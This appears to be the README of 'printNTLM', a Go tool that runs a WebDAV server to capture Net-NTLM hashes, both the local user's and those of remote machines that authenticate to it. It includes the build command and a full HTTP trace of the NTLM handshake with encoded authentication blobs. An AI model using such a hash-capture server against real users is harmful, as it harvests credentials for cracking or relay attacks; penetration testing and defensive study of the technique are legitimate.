# printNTLM

__On Windows:__
* Prints Net-NTLM hashes for the current user by starting a local webDAV server and authenticating
    to it
* Starts a persistent webDAV server the will capture hashes of remote computers authenticating to
    it

__On Linux:__
* Starts a persistent webDAV server the will capture hashes of remote computers authenticating to
    it

Importable as a library from `pkg` or run as a standalone binary with:

```sh
GOOS=windows go build
```

### Auth Flow

```http
OPTIONS /vf.xsl HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.17134
translate: f
Host: 3232288001:9090

HTTP/1.1 200 OK
Content-Type: text/html
Connection: Keep-Alive
Keep-Alive: timeout=5, max=100
Server: Microsoft-IIS/7.5
Allow: OPTIONS,GET,HEAD,POST,PUT,DELETE,TRACE,PROPFIND,PROPPATCH,MKCOL,COPY,MOVE,LOCK,UNLOCK
Content-Length: 85
Date: Mon, 04 Mar 2019 18:19:52 GMT


PROPFIND /vf.xsl HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.17134
Depth: 0
translate: f
Content-Length: 0
Host: 3232288001:9090

HTTP/1.1 401 Unauthorized
Content-Type: text/html
Connection: Keep-Alive
Keep-Alive: timeout=5, max=100
Server: Microsoft-IIS/7.5
Content-Length: 0
WWW-Authenticate: NTLM
Date: Mon, 04 Mar 2019 18:19:52 GMT


PROPFIND /vf.xsl HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.17134
Depth: 0
translate: f
Content-Length: 0
Host: 3232288001:9090
Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAKAO5CAAAADw==

HTTP/1.1 401 Unauthorized
Content-Type: text/html
Connection: Keep-Alive
Keep-Alive: timeout=5, max=100
Server: Microsoft-IIS/7.5
Content-Length: 0
WWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==
Date: Mon, 04 Mar 2019 18:19:52 GMT


PROPFIND /vf.xsl HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.17134
Depth: 0
translate: f
Content-Length: 0
Host: 3232288001:9090
Authorization: NTLM TlRMTVNTUAADAAAAGAAYAJoAAAAyATIBsgAAAB4AHgBYAAAABgAGAHYAAAAeAB4AfAAAAAAAAADkAQAABQKIogoA7kIAAAAPHqWlCjd4bptxz5nFF1Y7aEQARQBTAEsAVABPAFAALQAxAFMAQQBQAEoAOQBQAHIAZQBkAEQARQBTAEsAVABPAFAALQAxAFMAQQBQAEoAOQBQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAvcLUQFGeLU4dC4X2vsvMBAQAAAAAAAKMWFNy20tQBFB87KVOdmJUAAAAAAgAGAFMATQBCAAEAFgBTAE0AQgAtAFQATwBPAEwASwBJAFQABAASAHMAbQBiAC4AbABvAGMAYQBsAAMAKABzAGUAcgB2AGUAcgAyADAAMAAzAC4AcwBtAGIALgBsAG8AYwBhAGwABQASAHMAbQBiAC4AbABvAGMAYQBsAAgAMAAwAAAAAAAAAAEAAAAAIAAAV7rbmzXgwuw6KZWXF7KSFUlMK59J45Z1ZgVbV0tuWzcKABAAAAAAAAAAAAAAAAAAAAAAAAkANgBIAFQAVABQAC8AMwAyADMAMgAyADgAOAAwADAAMQAuAGwAbwBjAGEAbABkAG8AbQBhAGkAbgAAAAAAAAAAAA==

HTTP/1.1 200 OK
Content-Type: text/html
Connection: Keep-Alive
Keep-Alive: timeout=5, max=100
Server: Microsoft-IIS/7.5
Content-Length: 0
Date: Mon, 04 Mar 2019 18:19:52 GMT
```
